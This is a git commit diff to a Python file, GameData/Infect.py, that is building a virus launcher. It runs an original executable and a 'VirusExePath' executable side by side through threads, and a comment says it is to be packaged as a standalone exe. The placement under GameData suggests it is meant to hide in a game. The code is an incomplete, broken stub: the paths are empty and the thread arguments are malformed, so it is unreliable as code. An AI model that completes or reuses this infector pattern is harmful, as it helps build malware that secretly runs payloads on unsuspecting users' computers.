19d3747cecfa9813f49ac4fef37c3c0b18647d9a
techieji <drpradhyum2016@outlook.com>
2020-03-14 12:07:08 -0400

    Tried to make Infect.py standalone

--- GameData/Infect.py
+++ GameData/Infect.py
@@ -1,15 +1,18 @@
-import threading
+import threading                # Note that this file must be a stand alone exe
 import os
 from shutil import move
+
+OrgExePath = ""
+VirusExePath = ""
 
 def RunFile(exepath):
     os.startfile(exepath)
 
-def Infect():
-    pass
-
-OrgExePath = ""
-VirusExePath = ""
+def Infect(OrgExePatharg, VirusExePatharg):
+    global OrgExePath
+    global VirusExePath
+    OrgExePath = OrgExePatharg
+    VirusExePath = VirusExePatharg
 
 orgfile = threading.Thread(target=RunFile, args=(OrgExePath))
 ViralScript = threading.Thread(target=RunFile, args=(VirusExePath))
